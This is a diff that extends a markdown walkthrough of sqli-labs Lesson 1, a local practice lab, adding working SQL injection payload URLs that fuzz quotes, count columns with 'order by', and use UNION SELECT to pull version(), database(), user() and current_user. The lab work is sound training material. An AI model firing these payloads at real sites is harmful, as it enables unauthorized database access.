@@ -1,5 +1,7 @@
 #### 1. Lesson 1 - ``GET - Error based - Single Quote - String``
 
+###### Fuzzing
+
 ```
 http://127.0.0.1/sqli-labs/Less-1/?id=1
 http://127.0.0.1/sqli-labs/Less-1/?id=2
@@ -39,6 +41,8 @@ http://127.0.0.1/sqli-labs/Less-1/?id=1"
 ```
 
 ![](images/1/7.png)
+
+###### Vulnerability Breakdown
 
 ```
 http://127.0.0.1/sqli-labs/Less-1/?id=1'
@@ -112,6 +116,8 @@ http://localhost/sqli-labs/Less-1/?id=1'%23%20
 '1'--+     ' LIMIT 0,1
 ```
 
+###### Fix the query
+
 ```
 http://localhost/sqli-labs/Less-1/?id=1
 http://localhost/sqli-labs/Less-1/?id=1'
@@ -132,3 +138,68 @@ http://127.0.0.1/sqli-labs/Less-1/?id=1' AND 1=0 --+
 ![](images/1/15.png)
 
 ![](images/1/16.png)
+
+###### Identify the columns in the query
+
+```
+http://localhost/sqli-labs/Less-1/?id=1' order by 1--+
+http://localhost/sqli-labs/Less-1/?id=1' order by 2--+
+http://localhost/sqli-labs/Less-1/?id=1' order by 3--+
+http://localhost/sqli-labs/Less-1/?id=1' order by 4--+
+```
+
+![](images/1/17.png)
+
+![](images/1/18.png)
+
+![](images/1/19.png)
+
+![](images/1/20.png)
+
+```sql
+select col-1, col-2, col-3 from table where id = '  1' our_injection --+ ' 
+```
+
+###### Extract information
+
+```
+http://localhost/sqli-labs/Less-1/?id=1' union select 1,2,3 --+
+```
+
+![](images/1/21.png)
+
+```
+localhost/sqli-labs/Less-1/?id=999' union select 1,2,3 --+
+```
+
+![](images/1/22.png)
+
+```
+localhost/sqli-labs/Less-1/?id=999' union select 1,4,5 --+
+```
+
+![](images/1/23.png)
+
+```
+http://localhost/sqli-labs/Less-1/?id=999' union select 1,version(),5--+
+```
+
+![](images/1/24.png)
+
+```
+http://localhost/sqli-labs/Less-1/?id=999' union select 1,database(),5--+
+```
+
+![](images/1/25.png)
+
+```
+http://localhost/sqli-labs/Less-1/?id=999' union select 1,user(),5--+
+```
+
+![](images/1/26.png)
+
+```
+http://localhost/sqli-labs/Less-1/?id=999' union select 1,4,current_user-- 
+```
+
+![](images/1/27.png)
